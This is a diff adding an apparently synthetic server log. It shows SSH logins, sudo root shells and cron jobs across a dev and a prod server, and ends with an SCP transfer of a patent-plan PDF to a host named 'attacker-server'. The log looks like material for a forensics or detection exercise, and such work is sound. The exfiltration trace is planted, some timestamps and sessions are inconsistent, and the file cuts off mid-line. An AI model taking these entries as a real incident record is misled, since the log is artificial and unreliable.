@@ -1,0 +1,58 @@
+Oct  3 15:05:00 dev-server systemd[1]: Starting Daily apt download activities...
+Oct  3 15:05:01 dev-server CRON[3901]: (root) CMD (/usr/bin/apt update)
+Oct  3 15:05:02 dev-server systemd[1]: Started Daily apt download activities.
+Oct  3 15:05:05 dev-server systemd[1]: Starting Rotate log files...
+Oct  3 15:05:06 dev-server systemd[1]: logrotate.service: Succeeded.
+Oct  3 15:05:06 dev-server systemd[1]: Started Rotate log files.
+Oct  3 15:06:00 prod-server systemd[1]: Starting Daily apt download activities...
+Oct  3 15:06:01 prod-server CRON[3905]: (root) CMD (/usr/bin/apt update)
+Oct  3 15:06:02 prod-server systemd[1]: Started Daily apt download activities.
+Oct  3 15:06:20 prod-server sshd[3910]: Accepted password for dev from 192.168.1.12 port 50001 ssh2
+Oct  3 15:06:25 dev-server sudo[3912]: dev : TTY=pts/0 ; PWD=/home/dev ; USER=root ; COMMAND=/bin/journalctl -xe
+Oct  3 15:06:26 dev-server sudo[3912]: pam_unix(sudo:session): session opened for user root by dev(uid=0)
+Oct  3 15:06:40 dev-server CRON[3915]: (root) CMD (/usr/local/bin/backup.sh)
+Oct  3 15:06:50 dev-server sudo[3912]: pam_unix(sudo:session): session closed for user root
+Oct  3 15:07:10 prod-server sshd[3918]: Accepted password for admin from 192.168.1.13 port 50002 ssh2
+Oct  3 15:07:15 dev-server sudo[3920]: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/systemctl status sshd
+Oct  3 15:07:30 prod-server CRON[3925]: (root) CMD (/usr/bin/systemctl restart apache2)
+Oct  3 15:08:00 dev-server sshd[3930]: Disconnected from user dev 192.168.1.12 port 50001
+Oct  3 15:08:10 dev-server systemd[1]: Reloading OpenSSH server daemon.
+Oct  3 15:08:11 dev-server systemd[1]: Reloaded OpenSSH server daemon.
+Oct  3 15:08:30 prod-server sshd[3940]: Accepted publickey for developer from 192.168.1.14 port 50003 ssh2
+Oct  3 15:08:40 dev-server sudo[3950]: developer : TTY=pts/2 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/systemctl status apache2
+Oct  3 15:09:00 prod-server CRON[3955]: (root) CMD (/usr/bin/find /var/log -type f -mtime +7 -delete)
+Oct  3 15:09:10 dev-server sshd[3960]: Disconnected from user developer 192.168.1.14 port 50003
+Oct  3 15:09:20 dev-server systemd[1]: Stopping The Apache HTTP Server.
+Oct  3 15:09:25 dev-server systemd[1]: apache2.service: Succeeded.
+Oct  3 15:09:26 dev-server systemd[1]: Stopped The Apache HTTP Server.
+Oct  3 15:09:30 prod-server CRON[3965]: (root) CMD (/usr/local/bin/cleanup.sh)
+Oct  3 15:09:50 prod-server sshd[3970]: Accepted password for admin from 192.168.1.15 port 50004 ssh2
+Oct  3 15:10:00 dev-server systemd[1]: Stopping Session 10 of user admin.
+Oct  3 15:10:05 dev-server systemd[1]: Stopped Session 10 of user admin.
+Oct  3 15:10:12 dev-server sshd[4001]: Accepted password for admin from 192.168.1.10 port 51564 ssh2
+Oct  3 15:10:12 dev-server sshd[4001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Oct  3 15:10:15 prod-server systemd[1]: Reloading NGINX server daemon.
+Oct  3 15:10:20 prod-server systemd[1]: Reloaded NGINX server daemon.
+Oct  3 15:10:30 dev-server CRON[3980]: (root) CMD (/usr/bin/systemctl restart apache2)
+Oct  3 15:10:35 dev-server sudo[4005]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Oct  3 15:10:35 dev-server sudo[4005]: pam_unix(sudo:session): session opened for user root by admin(uid=0)
+Oct  3 15:10:40 dev-server sshd[3985]: Accepted password for developer from 192.168.1.16 port 50005 ssh2
+Oct  3 15:11:00 dev-server sudo[3990]: developer : TTY=pts/3 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/journalctl -f
+Oct  3 15:11:10 dev-server sudo[3990]: pam_unix(sudo:session): session opened for user root by developer(uid=0)
+Oct  3 15:11:12 prod-server sshd[4101]: Accepted password for root from 192.168.1.20 port 53322 ssh2
+Oct  3 15:11:12 prod-server sshd[4101]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct  3 15:11:25 dev-server sudo[3990]: pam_unix(sudo:session): session closed for user root
+Oct  3 15:11:30 prod-server sshd[3995]: Disconnected from user admin 192.168.1.15 port 50004
+Oct  3 15:11:45 prod-server sudo[4105]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Oct  3 15:11:45 prod-server sudo[4105]: pam_unix(sudo:session): session opened for user root by root(uid=0)
+Oct  3 15:11:47 prod-server systemd[1]: Stopping Session 15 of user admin.
+Oct  3 15:11:50 dev-server systemd[1]: Started Session 11 of user developer.
+Oct  3 15:12:00 prod-server systemd[1]: Stopped Session 15 of user admin.
+Oct  3 15:12:05 dev-server sshd[4000]: Disconnected from user developer 192.168.1.16 port 50005
+Oct  3 15:12:10 prod-server scp[4110]: SCP transfer started from /home/admin/rencana-paten.pdf to attacker-server:/tmp/rencana-paten.pdf
+Oct  3 15:12:20 prod-server scp[4110]: SCP transfer completed successfully.
+Oct  3 15:12:30 dev-server systemd[1]: Starting Reload service...
+Oct  3 15:12:35 dev-server systemd[1]: Reloaded service.
+Oct  3 15:12:40 prod-server sshd[4101]: pam_unix(sshd:session): session closed for user root
+Oct  3 15:12:50 dev-server sshd[4001]: pam_unix(sshd:session): session closed for user admin
+Oct  3 15:12:45 prod-server sshd
